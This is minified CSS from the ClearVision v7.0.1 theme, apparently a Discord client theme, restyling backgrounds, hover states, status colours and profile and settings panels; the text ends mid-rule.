v7.0.1 by ClearVision Team */.visual-refresh .header__0b563{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5)) !important}.visual-refresh .container__0b563{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4)) !important}.visual-refresh .pageBody__41ed7{background:rgba(0,0,0,0)}.visual-refresh .container_bc0d35{background:var(--hsl-card-shading)}.visual-refresh .container_bc0d35.adminUpsell_bc0d35{background:var(--hsl-main-color)}.visual-refresh .channelRow_e4503a{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0);margin-bottom:8px;border-radius:8px}.visual-refresh .channelRow_e4503a:hover:not(.disabled_e4503a){background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.visual-refresh .prompt__5d7c9{background:rgba(0,0,0,0);border:none}.visual-refresh .optionButtonWrapper__270d7{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh .optionButtonWrapper__270d7:hover{background:var(--hsl-card-shading)}.visual-refresh .optionButtonWrapper__270d7.selected__270d7{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.checkIcon__270d7{background:var(--hsl-main-color)}.profileCard__5d7c9{background:var(--hsl-card-shading)}.role__5d7c9{background:rgba(0,0,0,0);position:relative}.roleDot__5d7c9::before{content:"""";top:-1px;right:-1px;bottom:-1px;left:-1px;position:absolute;background:inherit;opacity:.2;border-radius:4px}.emptyPage__5d7c9{background-color:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container__551b0{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2))}.visual-refresh .navItem__551b0{position:relative;z-index:1}.visual-refresh .navItem__551b0:after{content:"""";position:absolute;top:0;right:100%;bottom:0;left:0;transition:all .3s ease-in-out;z-index:-1;border-radius:4px}.visual-refresh .navItem__551b0.selected__551b0{background:rgba(0,0,0,0)}.visual-refresh .navItem__551b0.selected__551b0:after{right:0;background:var(--hsl-main-color);animation:cv-channel-select .3s ease-in-out}.backdrop__8a7fc{background:var(--hsl-popout-shading)}.relative__8a7fc{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5))}.iconButton__8a7fc{background:var(--hsl-main-color)}.iconButton__8a7fc:hover{background:var(--hsl-hover-color)}.visual-refresh .container_a592e1{border:none}.visual-refresh .scroller__23746{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh:is(.theme-dark,.theme-light) .card__84e3e{background:var(--hsl-card-shading);border:none}.visual-refresh:is(.theme-dark,.theme-light) .card__84e3e:hover{background:var(--hsl-card-shading);box-shadow:0 0 0 2px var(--hsl-hover-color)}.visual-refresh .avatar_f215b9{background:var(--hsl-card-shading);border:none}.visual-refresh .card_f215b9:hover .avatar_f215b9{background:var(--hsl-card-shading)}.container__19cf2,.container__5682d{background:var(--hsl-card-shading)}.visual-refresh:is(.theme-light,.theme-dark) .iconMask__4cb8a{background:var(--hsl-card-shading);width:48px;height:48px;padding:0;margin-left:8px}.visual-refresh .card__4cb8a:hover .iconMask__4cb8a{background:var(--hsl-card-shading)}.presenceCountDot__4cb8a{background:var(--hsl-online-color)}.container_cbd375{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .container_cec934{background:var(--hsl-card-shading)}.visual-refresh .container__956c6{background:rgba(0,0,0,0)}.visual-refresh .modalBg_de2fa0{background:var(--hsl-modal-shading)}.visual-refresh .modalContent_de2fa0,.visual-refresh .contentHeader_de2fa0{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container__133bf{background:none;border:none}.visual-refresh .tabBody__133bf{background:none}.visual-refresh .peopleColumn__133bf{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.blockedIgnoredSettingsNotice__6811a{border:1px solid var(--hsl-main-color);background-color:var(--hsl-card-shading)}.actionButton_f8fa06{background-color:var(--hsl-card-shading)}.actionButton_f8fa06.highlight_f8fa06{background-color:var(--hsl-card-shading);color:var(--interactive-active)}.actionButton_f8fa06:hover{background:var(--hsl-hover-color)}.actionButton_f8fa06.actionAccept_f8fa06{color:var(--hsl-success-color)}.actionButton_f8fa06.actionAccept_f8fa06:hover{background:var(--hsl-success-color);color:var(--interactive-active)}.actionButton_f8fa06.actionDeny_f8fa06{color:var(--hsl-danger-color)}.actionButton_f8fa06.actionDeny_f8fa06:hover{background:var(--hsl-danger-color);color:var(--interactive-active)}.visual-refresh .searchBar__5ec2f{border-width:2px}.visual-refresh .tabBar__133bf .addFriend__133bf.addFriend__133bf.addFriend__133bf{background-color:rgba(0,0,0,0);color:var(--text-secondary);border:none}.visual-refresh .tabBar__133bf .addFriend__133bf.addFriend__133bf.addFriend__133bf:hover{background-color:var(--background-modifier-accent)}.visual-refresh .tabBar__133bf .addFriend__133bf.addFriend__133bf.addFriend__133bf[aria-selected=true]{background-color:var(--hsl-main-color);color:var(--text-primary)}.addFriendInputWrapper__72ba7{background:var(--hsl-input-shading);border:2px solid var(--hsl-input-border-shading)}.addFriendInputWrapper__72ba7:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.input__72ba7{background:rgba(0,0,0,0);box-shadow:none}.nowPlayingColumn__133bf{background:none}.container__7d20c{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2))}.visual-refresh .scroller__7d20c{border:none}.visual-refresh .outer_bf1984,.visual-refresh .outer_bf1984:is(.interactive_bf1984:hover,.active_bf1984){background-color:var(--hsl-card-shading);border:none}.visual-refresh .section__00943{border:none}.emptyCard__7e549{background-color:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .page_c791b2{background:rgba(0,0,0,0) !important}.visual-refresh .mainTableContainer__09a38{background:var(--hsl-card-shading);border:none}.newMembersNotice_acdcc0{background:var(--hsl-main-color)}.newMembersNotice_acdcc0:hover{background:var(--hsl-hover-color)}.otherRoles__71c22{background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.list_f391e3{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}/*! ClearVision v7.0.1 by ClearVision Team */.applicationStore_f07d62{background:rgba(0,0,0,0)}.visual-refresh .homeWrapper__0920e{background:rgba(0,0,0,0);border:none}.mainPageScroller_ca1a02,.allPerksScroller_ca1a02{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.mainPageScroller_ca1a02{right:0;transition:all .75s ease-in-out}.mainPageScroller_ca1a02:has(+.open_ca1a02){right:100%}.card_f8e6bf,.container_da4aee{background:var(--hsl-card-shading)}:is(.images-light,.images-dark) .textContainer_da4aee{background:none}.giftCardButton_da4aee{background:rgba(0,0,0,0)}.cardDescription_f8e6bf{background:var(--hsl-popout-shading)}.seeAllPerksButton_ca1a02{background:var(--hsl-card-shading);border:none}.backButton_b9abc5{background:var(--hsl-main-color)}.backButton_b9abc5:hover{background:var(--hsl-hover-color)}:is(.theme-dark,.theme-light) :is(.leftArrow__3cf14,.rightArrow__3cf14){background:var(--hsl-card-shading)}:is(.theme-dark,.theme-light) :is(.leftArrow__3cf14,.rightArrow__3cf14):hover{background:var(--hsl-hover-color)}:is(.theme-dark,.theme-light) .inactiveArrow__3cf14{background:var(--hsl-card-shading)}.cardProgressBar__3cf14{background:var(--hsl-card-shading)}.selectedDot__3cf14{background:var(--hsl-main-color)}.innerWrapper_c511e4{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.background__7449f :is(.scrollerBase__99f8c,.scrollerBase_d125d2){background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .row_d13feb{background:var(--hsl-card-shading);border:var(--hsl-card-shading)}.headerIcon__553a5{background-color:var(--hsl-card-shading);border-color:rgba(0,0,0,0)}.container__86ab2{background:var(--hsl-popout-shading);border:none}.avatarWrapper__86ab2{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.shopScroll__6db1d,.pageWrapper__6db1d{background:rgba(0,0,0,0)}.visual-refresh .shop__6db1d{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .shop__08415{background:rgba(0,0,0,0)}.visual-refresh .shopCard_c3d04b{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh .shopCard_c3d04b:hover{border-color:var(--hsl-main-color)}.visual-refresh .cardText_c3d04b{background:rgba(0,0,0,0);border:none}.visual-refresh .skeleton__72fa0,.skeleton__08415{background:var(--hsl-card-shading-inverted)}.cardBody__72fa0,.skeletonBody__08415{background:var(--hsl-card-shading-inverted)}:is(.cardAvatar__72fa0,.cardTitle__72fa0,.cardDescription__72fa0,.cardSummary__72fa0){background:rgba(0,0,0,0)}.collectibleInfoContainer_c50f62{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .scroller__4a84a,.visual-refresh .scroller_fb04e1{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .wrapper__4e6ce{background:rgba(0,0,0,0)}.loadingPopout__58f1c{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.autocomplete__13533{background:var(--hsl-popout-shading);box-shadow:none}.clickable__13533[aria-disabled=false] .base__13533:hover{background:var(--hsl-hover-color)}.clickable__13533[aria-selected=true] .base__13533{background:var(--hsl-hover-color)}.contentTitle__13533{padding:4px 8px;color:var(--header-primary)}.visual-refresh .wrapper_b1e4f3{background:rgba(0,0,0,0)}.selected__1a58a,.selected__1a58a:hover{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.lookFilled__3f413.select__3f413{box-shadow:none}.lookFilled__3f413.select__3f413:hover{border:1px solid var(--input-border)}.popout__3f413,.popout__3f413.popoutPositionTop__3f413{background:var(--hsl-popout-shading);border:none}.option__3f413{border-radius:8px;margin:0 8px}.option__3f413:hover{background:var(--hsl-hover-color)}.option__3f413[aria-selected=true]{background:var(--hsl-main-color)}.option__3f413[aria-selected=true]:not(.option__3f413.multi__3f413){background:var(--hsl-main-color)}.selectedIcon__3f413{color:var(--interactive-active)}.selectedIcon__3f413 circle{fill:var(--hsl-main-color)}.multiSelectCheckbox__3f413.checked__3f413{background:var(--interactive-active)}.multiSelectCheckbox__3f413.checked__3f413 path{fill:var(--hsl-main-color)}.optionPillItem__3f413 .optionPillBtn__3f413{background:rgba(0,0,0,0);border:none}.optionPillItem__3f413 .optionPillBtn__3f413 .optionPillBtn__3f413{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .recentMentionsPopout__95796{background:var(--hsl-popout-shading);box-shadow:none}.visual-refresh .header_ab6641{background:rgba(0,0,0,0)}.visual-refresh .channelHeader__35a7e{background:hsl(from var(--hsl-main-color) h s l/0.8);padding-left:20px;padding-right:6px;border-radius:8px}.visual-refresh .guildIcon__35a7e{background-color:var(--hsl-card-shading)}.visual-refresh .button__06eda{background:var(--hsl-card-shading)}.visual-refresh .icon_d404a3{background:var(--hsl-main-color);color:var(--header-primary)}.visual-refresh .container__0f711{background:rgba(0,0,0,0)}.visual-refresh .maskBackground_db811b{background:var(--hsl-main-color) !important}.visual-refresh .tutorial__2692d{background:var(--hsl-card-shading)}.visual-refresh .tutorialIcon__2692d{background:var(--hsl-main-color);color:var(--interactive-active)}.visual-refresh .messages__1ccd1{background:var(--hsl-card-shading);border:none}.visual-refresh .collapseButton__427f0{left:0}.visual-refresh .container__95796{margin-left:16px}.visual-refresh .messageContainer__95796{background:var(--hsl-card-shading);border:none;margin:0}/*! ClearVision v7.0.1 by ClearVision Team */.menu_c1e9c4{background:var(--hsl-popout-shading);border:none;border-radius:5px}.colorDefault_c1e9c4.focused_c1e9c4{background-color:var(--hsl-hover-color)}.colorDefault_c1e9c4:active:not(.hideInteraction_c1e9c4){background-color:var(--hsl-main-color)}.colorDanger_c1e9c4.focused_c1e9c4{background-color:var(--hsl-danger-color)}.colorDanger_c1e9c4.focused_c1e9c4:not(.checkboxContainer_c1e9c4) path{fill:var(--interactive-active)}.colorDanger_c1e9c4:active:not(.hideInteraction_c1e9c4){background-color:hsl(from var(--hsl-danger-color) h s l/0.8);color:var(--interactive-active)}.colorDanger_c1e9c4:active:not(.hideInteraction_c1e9c4) .label_c1e9c4{color:var(--interactive-active)}.item_c1e9c4.focused_c1e9c4 .label_c1e9c4{color:var(--header-primary)}.status_a423bd[style*=""rgb(130, 131, 139)""]{background-color:var(--hsl-offline-color) !important}.status_a423bd[style*=""rgb(67, 162, 90)""]{background-color:var(--hsl-online-color) !important}.status_a423bd[style*=""rgb(202, 150, 84)""]{background-color:var(--hsl-idle-color) !important}.status_a423bd[style*=""rgb(216, 58, 66)""]{background-color:var(--hsl-dnd-color) !important}.focused_c1e9c4#set-status-submenu-online{background-color:var(--hsl-online-color)}.focused_c1e9c4#set-status-submenu-idle{background-color:var(--hsl-idle-color)}.focused_c1e9c4#set-status-submenu-dnd{background-color:var(--hsl-dnd-color)}.focused_c1e9c4#set-status-submenu-invisible{background-color:var(--hsl-offline-color)}.activeIcon_d40c56 path{fill:var(--hsl-main-color)}.focused_d40c56 .activeIcon_d40c56 circle{fill:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.tooltipPrimary__382e7{background-color:var(--hsl-popout-shading);border:none}.tooltipPrimary__382e7 .tooltipPointer__382e7{border-top-color:var(--hsl-popout-shading)}.tooltipPrimary__382e7 .tooltipPointer__382e7::before,.tooltipPrimary__382e7 .tooltipPointer__382e7::after{display:none}.tooltipBrand__382e7{background-color:var(--hsl-main-color);border:none}.tooltipBrand__382e7 .tooltipPointer__382e7{border-top-color:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .contentWrapper__08434{background:var(--hsl-popout-shading);border:none}.visual-refresh .inspector_aeaaeb{background:rgba(0,0,0,0);border:none}.visual-refresh .navButton__08434{border-radius:5px}.visual-refresh .navButton__08434:hover{background:var(--background-modifier-accent)}.visual-refresh .navButtonActive__08434{background:var(--hsl-main-color)}.visual-refresh .navButtonActive__08434:hover{background:var(--hsl-main-color)}.visual-refresh .emojiPickerHasTabWrapper_c0e32c :is(.emojiPicker_c0e32c,.header_c0e32c){background:rgba(0,0,0,0)}.visual-refresh .wrapper__14245{background:hsl(from var(--hsl-main-color) h s l/0.8);margin-bottom:10px;border-radius:4px}.visual-refresh .wrapper__14245::after{height:0}.visual-refresh .searchBar_c0e32c{margin-right:12px}.visual-refresh :is(.emojiPicker_c0e32c,.header_c0e32c){background:var(--hsl-popout-shading);border:none}.visual-refresh .header__8ef02{background:rgba(0,0,0,0)}.visual-refresh .packHeader_e94b8c{margin-left:-8px;margin-bottom:10px}.visual-refresh .container_fed6d3,.visual-refresh .header_fed6d3{background:rgba(0,0,0,0);border:none}.emojiItem_fc7141.emojiItemSelected_fc7141{background:var(--background-modifier-accent)}.stickerInspected_c6367b .inspectedIndicator_c6367b{background:var(--background-modifier-accent)}.categoryFadeBlurple_d02962{background:hsl(from var(--hsl-main-color) h s l/0.8)}.categoryFadeBlurple_d02962,.categoryFadeBlurple_d02962:hover{border:none}.categoryFade_d02962{border:none}.categoryFade_d02962:hover{border:2px solid var(--hsl-main-color)}.categoryItemDefaultCategorySelected_b9ee0c,.categoryItemDefaultCategorySelected_b9ee0c:hover{background:var(--hsl-main-color)}.stickerCategoryGenericSelected__3ad28,.stickerCategoryGenericSelected__3ad28:hover,.firstPartyCategorySelected__3ad28,.firstPartyCategorySelected__3ad28:hover{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .messagesPopoutWrap__45690{background:var(--hsl-popout-shading);box-shadow:none}.visual-refresh .header__45690,.visual-refresh .footer__45690{background:rgba(0,0,0,0)}.visual-refresh .messageGroupWrapper__45690{background:var(--background-modifier-accent);border:none}.visual-refresh .jumpButton__45690{background:var(--hsl-main-color);border-color:rgba(0,0,0,0);color:var(--interactive-active)}.visual-refresh .jumpButton__45690:hover{background:var(--hsl-hover-color);color:var(--interactive-active)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container__55c99{background:var(--hsl-popout-shading);border:none}.queryContainer__55c99{background:rgba(0,0,0,0)}.option__56fec:hover{background-color:var(--hsl-hover-color)}.option__56fec:hover :is(.filter__56fec,.answer__56fec,.plusIcon__56fec){color:var(--interactive-active)}.option__56fec:hover :is(.searchResultChannelIcon__56fec,.searchResultChannelCategory__56fec){opacity:1}.option__56fec:hover strong{color:var(--interactive-active)}.option__56fec[aria-selected=true]{background-color:var(--hsl-hover-color);box-shadow:none}.option__56fec[aria-selected=true] :is(strong,.plusIcon__56fec){color:var(--interactive-active)}.datePicker__56fec .datePickerHint__56fec .hintValue__56fec{background:var(--hsl-main-color);padding:0 5px}.calendarPicker_d27f17 .react-datepicker,.calendarPicker_d27f17 .react-datepicker__header{background:rgba(0,0,0,0)}.calendarPicker_d27f17 .react-datepicker__current-month{color:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .calendarPicker_d27f17 .react-datepicker__day-name{color:var(--header-primary)}.calendarPicker_d27f17 .react-datepicker__month{border:1px solid var(--hsl-main-color);background:var(--hsl-card-shading);border-radius:4px}.calendarPicker_d27f17 .react-datepicker__day.react-datepicker__day--selected::after{background:var(--hsl-main-color)}.calendarPicker_d27f17 .react-datepicker__day:is(.react-datepicker__day--keyboard-selected,.react-datepicker__day--selected:hover,:hover){background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .calendarPicker_d27f17 .react-datepicker__day:is(.react-datepicker__day--disabled,.react-datepicker__day--disabled:hover){background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .browser_d98031{background-color:var(--hsl-popout-shading);box-shadow:none}.visual-refresh .header_d9c882{background:rgba(0,0,0,0)}.visual-refresh .container__6764b{background:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.visual-refresh .container__6764b:hover{background:var(--background-modifier-accent);border:2px solid var(--hsl-hover-color)}.icon__1b24f{background:var(--hsl-main-color);color:var(--header-primary)}.popout__76f04{background-color:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.contentWrapper__9c62c{background:var(--hsl-popout-shading);box-shadow:none}.sectionRowsContentContainer__927fc{gap:8px}.container_cb32c7{background:var(--background-modifier-accent)}.container_cb32c7:hover{background:var(--hsl-card-shading);box-shadow:0 0 0 2px var(--hsl-hover-color)}.rowContainer_cb32c7,.rowContainer_cb32c7:first-child,.rowContainer_cb32c7:last-child{border-radius:8px}.rowDivider_cb32c7{background:rgba(0,0,0,0)}.container__7bdb0{background:rgba(0,0,0,0)}.overviewContainerNoVideo__95856,.overviewContainerWithVideo__95856{background:rgba(0,0,0,0)}.commandContainer_c94584{gap:8px;background:rgba(0,0,0,0)}.commandContainer_c94584 .command_c94584{border:2px solid rgba(0,0,0,0)}.commandContainer_c94584 .command_c94584:not(:last-child){border:2px solid rgba(0,0,0,0)}.commandContainer_c94584 .command_c94584:not(:last-child):hover{border-color:var(--hsl-hover-color)}.commandContainer_c94584 :is(.command_c94584,.command_c94584:first-child,.command_c94584:last-child){border-radius:8px}.command_c94584{background:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.command_c94584:hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.sectionContentContainer_b18295{display:flex;flex-direction:column;background:rgba(0,0,0,0);gap:8px}.clickable__761e5{background:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.clickable__761e5:hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.clickable__761e5,.clickable__761e5:first-child,.clickable__761e5:last-child{border-radius:8px}.underline__761e5{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(.picker__09f65,.picker__09f65.refresh__09f65){background:var(--hsl-popout-shading)}.visual-refresh .soundButtonWrapper__9be63{background:rgba(0,0,0,0)}.visual-refresh :is(.soundButton__9be63,.soundButtonRefresh__9be63){background-color:var(--background-modifier-accent)}.visual-refresh :is(.soundButton__9be63,.soundButtonRefresh__9be63):is(:hover,:focus-within,.focused__9be63){border-color:var(--hsl-main-color)}.visual-refresh :is(.soundButton__9be63,.soundButtonRefresh__9be63):is(:hover,:focus-within,.focused__9be63).hoverActiveBackground__9be63{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .popoutContainer__0f481{background:var(--hsl-popout-shading);box-shadow:none;-webkit-backdrop-filter:none;backdrop-filter:none}.guildSection_d5cd2d{background:rgba(0,0,0,0)}.containerBackground_d4ced7{background:var(--hsl-popout-shading);border:none}.containerBackground_d4ced7::after{border-top-color:var(--hsl-popout-shading)}.contentWarningPopout_be95d0{background:var(--hsl-popout-shading);box-shadow:none}:is(.theme-dark,.theme-light) .footer_be95d0{background:rgba(0,0,0,0)}.spinnerContainer__86bf6{background:var(--hsl-popout-shading)}.visual-refresh .streamPreview__6da2d{background:var(--hsl-popout-shading)}.previewContainer__6da2d{background:rgba(0,0,0,0)}:is(.theme-dark,.theme-light) .watchButton__6da2d{border-color:var(--hsl-main-color)}:is(.theme-dark,.theme-light) .watchButton__6da2d:not([disabled]):hover{border-color:var(--hsl-hover-color)}.container__4e30a{background:var(--hsl-popout-shading)}.visual-refresh .container_b1bfd4{background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.full-motion .translate_faf9c0{transform:unset !important}.user-profile-popout:not(.custom-user-profile-theme)::before{content:"""";position:absolute;width:100%;height:100%;background:var(--user-popout-image) var(--user-popout-position)/var(--user-popout-size) no-repeat;background-attachment:var(--user-popout-attachment);filter:var(--user-popout-filter);z-index:-1}.user-profile-modal:not(.custom-user-profile-theme)::before{content:"""";position:absolute;width:100%;height:100%;background:var(--user-modal-image) var(--user-modal-position)/var(--user-modal-size) no-repeat;background-attachment:var(--user-modal-attachment);filter:var(--user-modal-filter);z-index:-1}.outer_c0bea0:not(.custom-user-profile-theme){background:var(--hsl-background-shading)}.outer_c0bea0:not(.custom-user-profile-theme) .inner_c0bea0{background:rgba(0,0,0,0)}.outer_c0bea0:not(.custom-user-profile-theme) .outer_ab8609{background:var(--hsl-popout-shading)}.outer_c0bea0:not(.custom-user-profile-theme) .outer_ab8609::before,.outer_c0bea0:not(.custom-user-profile-theme) .outer_ab8609::after{display:none}.outer_c0bea0:not(.custom-user-profile-theme) .inner_ab8609{background:rgba(0,0,0,0)}.overlay_c0bea0{background-color:var(--hsl-card-shading)}.note_fcb628 .textarea__9daae{border:none;background:var(--hsl-input-shading)}.note_fcb628 .textarea__9daae:focus{background:var(--hsl-input-shading)}.visual-refresh .custom-user-profile-theme .inlineContainer__74017{background:var(--user-profile-note-background-focus);box-shadow:0 0 0 2px var(--user-profile-border)}.visual-refresh .custom-user-profile-theme .inlineContainer__74017:focus-within{box-shadow:0 0 2px 2px var(--profile-gradient-primary-color)}.visual-refresh .custom-user-profile-theme .top_b3f026 .item_b3f026{--selected-tab-item-color: var(--profile-gradient-secondary-color)}.visual-refresh .custom-user-profile-theme .top_b3f026 .item_b3f026.selected_b3f026{--selected-tab-item-color: var(--profile-gradient-primary-color)}.custom-user-profile-theme ::-webkit-scrollbar-thumb{background-color:var(--profile-gradient-primary-color)}.custom-user-profile-theme .textarea__9daae{background:var(--user-profile-note-background-focus)}.custom-user-profile-theme .textarea__9daae:focus{box-shadow:0 0 2px 2px var(--profile-gradient-primary-color);background:var(--user-profile-note-background-focus)}.user-profile-sidebar:not(.custom-user-profile-theme){background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3))}/*! ClearVision v7.0.1 by ClearVision Team */.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6{border-radius:4px;position:relative}.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6 .roleRemoveButton_dfa8b6{position:static}.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6 .roleRemoveIcon_dfa8b6{left:12px}.outer_c0bea0:not(.custom-user-profile-theme) .role_dfa8b6 .roleCircle__4f569::before{content:"""";top:-1px;right:-1px;bottom:-1px;left:-1px;position:absolute;background:inherit;opacity:.2;border-radius:4px}.background__4f569{fill:none}.dotBorderBase__4f569{fill:none}.dotBorderColor__4f569{opacity:1}.visual-refresh .container__3dde2{background:var(--hsl-popout-shading);border:none}/*! ClearVision v7.0.1 by ClearVision Team */.mask__44b0c rect[fill*=""#82838b""]{fill:var(--hsl-offline-color)}.mask__44b0c rect[fill*=""#43a25a""]{fill:var(--hsl-online-color)}.mask__44b0c rect[fill*=""#ca9654""]{fill:var(--hsl-idle-color)}.mask__44b0c rect[fill*=""#d83a42""]{fill:var(--hsl-dnd-color)}.mask__44b0c rect[fill*=""#9147ff""]{fill:var(--hsl-streaming-color)}/*! ClearVision v7.0.1 by ClearVision Team */.layer__960e4{background-color:rgba(0,0,0,0)}.contentRegion__23e6b{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .contentRegionScroller__23e6b{background:rgba(0,0,0,0)}.contentColumnDefault__23e6b{padding-top:50px}.visual-refresh .container_fcf29c{background:var(--hsl-popout-shading);border:none}.visual-refresh .cardPrimary__73069,.visual-refresh .cardPrimary__73069.editable__73069{background:var(--hsl-card-shading);border-color:rgba(0,0,0,0)}.card__73069 a{color:var(--hsl-main-color)}.card_b846e5::before{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.container__6cd3a,.clickableContainer__6cd3a{background:rgba(0,0,0,0)}.visual-refresh .backgroundModifierContainer__6cd3a{background:var(--hsl-card-shading);border-top-color:rgba(0,0,0,0);border-left-color:rgba(0,0,0,0);border-bottom-color:rgba(0,0,0,0)}.visual-refresh .backgroundModifierContainer__6cd3a:is(:hover,:active):not(.disabled__6cd3a):not(.noAction__6cd3a){background:var(--hsl-card-shading)}.visual-refresh .backgroundModifierContainer__6cd3a.selected__6cd3a{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.visual-refresh .selected__6cd3a.statusGreen__6cd3a{border-color:var(--status-positive)}.visual-refresh .selected__6cd3a.statusYellow__6cd3a{border-color:var(--status-warning)}.visual-refresh .selected__6cd3a.statusOrange__6cd3a{border-color:var(--orange-360)}.visual-refresh .selected__6cd3a.statusRed__6cd3a{border-color:var(--status-danger)}.visual-refresh .collapseable__217b7,.visual-refresh .collapseable__217b7:active{background:var(--hsl-card-shading);border:none}.default_e18686,.default_e18686:hover{background-color:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .standardSidebarView__23e6b{background:rgba(0,0,0,0)}.visual-refresh .sidebarRegionScroller__23e6b{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3));padding:20px 8px 60px 20px}/*! ClearVision v7.0.1 by ClearVision Team */.selectedBackground_e681d1{background:rgba(0,0,0,0)}.accountProfileCard__1fed1{background:var(--hsl-card-shading)}.badgeList__1fed1,.background__1fed1,.fieldList__1fed1{background:rgba(0,0,0,0)}.visual-refresh .container_d878e7{background:rgba(0,0,0,0)}.avatarBackground_eb2508{background:rgba(0,0,0,0)}.option__54675{background:var(--background-modifier-accent)}.option__54675:hover{border:2px solid var(--hsl-main-color)}.card__5cea9{background:var(--hsl-card-shading)}.header__5cea9{background:rgba(0,0,0,0)}.visual-refresh .box_f8c98c{background:var(--hsl-card-shading);border:none}.row__0624f{background:var(--background-modifier-accent);border:none}.authedAppV2__50a54{background:var(--hsl-card-shading)}.headerV2__50a54{background:rgba(0,0,0,0)}.appDetailsContainer__50a54{background:rgba(0,0,0,0)}.appDetailsContainer__50a54 .appDetailsSection__50a54{background:var(--background-modifier-accent);padding:16px}.appDetailsContainer__50a54 .appDetailsSection__50a54:active{background:var(--background-modifier-accent)}.appDetailsContainer__50a54 .appDetailsSection__50a54:first-child{border-radius:8px 8px 0 0}.appDetailsContainer__50a54 .appDetailsSection__50a54:nth-child(2){border-radius:0 0 8px 8px}.actionMenuButton_d84e0f{background:var(--background-modifier-accent)}.sessionIcon__803f2{background:var(--hsl-main-color);color:var(--header-primary)}.connectContainer_c7f964,.connection_c7f964{background:var(--hsl-card-shading)}.connectionsContainer_c7f964{justify-content:center}.accountButtonInner_c7f964,.accountBtnInner__750de{background-color:var(--background-modifier-accent);border:2px solid rgba(0,0,0,0)}.accountButtonInner_c7f964:hover,.accountBtnInner__750de:hover{background-color:var(--background-modifier-accent);border-color:var(--hsl-main-color)}.connectionHeader_c7f964{background:rgba(0,0,0,0);padding-bottom:0}.metadataContainer_c7f964{background-color:var(--background-modifier-accent)}.perkCard_b62c4e{background:var(--hsl-card-shading)}.innerWrapperBase__70f7f{background:var(--hsl-popout-shading)}.subButton__70f7f{color:var(--hsl-main-color) !important}.giftButton_b322b1:hover{background:rgba(0,0,0,0)}.giftCard_a45ed3{background:var(--hsl-card-shading)}.guildContainer__5dba5,.boostContainer_ceb06a{background:var(--hsl-card-shading)}.appliedBoostContainer_ceb06a{background:rgba(0,0,0,0)}.detailsBlock_e335a7{background:var(--hsl-card-shading)}.paymentPane__01014{background:var(--hsl-card-shading)}.paginator__01014,.payment_e9cb00{background:rgba(0,0,0,0)}.expandedInfo_e9cb00{background:var(--background-modifier-accent)}:is(.theme-light,.theme-dark) .hoverablePayment_e9cb00:hover{background:rgba(0,0,0,0)}:is(.theme-light,.theme-dark) 